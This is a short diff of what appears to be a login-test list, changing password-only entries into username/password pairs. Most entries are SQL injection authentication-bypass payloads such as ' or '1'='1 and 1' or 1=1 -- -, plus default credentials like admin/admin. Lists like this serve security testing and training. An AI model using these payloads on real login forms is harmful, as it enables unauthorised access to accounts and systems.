@@ -1,16 +1,16 @@
-Password:
+Username:            Password:
 
-tom
+admin                admin
 
-' or '1'='1 
+admin                ' or '1'='1 
 
-' or 1='1
+admin                ' or 1='1
 
-1' or 1=1 -- -
+admin                1' or 1=1 -- -
 
-' or '1'='1
+' or '1'='1          ' or '1'='1
 
 
-' or ' 1=1
+' or ' 1=1           ' or ' 1=1
 
-blah
+1' or 1=1 -- -       blah
